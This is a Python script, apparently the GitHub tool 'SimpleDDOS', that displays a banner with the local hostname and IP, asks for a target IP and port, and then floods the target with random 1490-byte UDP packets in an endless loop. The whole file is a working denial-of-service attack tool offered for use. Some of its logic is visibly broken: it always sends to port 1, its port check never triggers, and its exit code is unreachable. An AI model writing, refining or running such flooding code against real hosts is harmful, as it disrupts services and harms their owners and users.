import os, socket, time, random, datetime
from colorama import Fore

class color:
    RED = Fore.RED
    RESET = Fore.RESET

date = hora = datetime.datetime.now() 
hostname = socket.gethostname()
ip = socket.gethostbyname(hostname)

def clear():
  if os.name == "nt":
    os.system("cls")
  else:
    os.system("clear")

def menu():
    clear()
    title = f'''
██████╗ ██████╗  ██████╗ ███████╗  [-] Copyright ©2024 By ZombieGeek0
██╔══██╗██╔══██╗██╔═══██╗██╔════╝  [-] GitHub: https://www.github.com/ZombieGeek0/SimpleDDOS
██║  ██║██║  ██║██║   ██║███████╗  [-] Hostname: {hostname}
██║  ██║██║  ██║██║   ██║╚════██║  [-] IP: {ip}
██████╔╝██████╔╝╚██████╔╝███████║  [-] Date: {date}
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝                                 
'''
    print(color.RED + title)

    mydate = time.strftime('%Y-%m-%d')
    mytime = time.strftime('%H-%M')
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    ip = input(f"{color.RED}[-] Target IP: ")
    port = input(f'{color.RED}[-] Enter your attacking port: ')
    print(f"{color.RED}[-] Attacking on: {ip} and port {port} at time {date}...\n")
    
    time.sleep(2.5)
    sent = 0
    
    while True:
        sock.sendto(bytes, (ip, 1))
        sent = sent + 1
        print(f"    | [ Sent Packet: {sent} through {ip}:{port} at time {date} ]")
        if port == 65534:
            port = 1
    
    clear()
    input("\n[-] Press the ENTER key to exit: ")

menu()
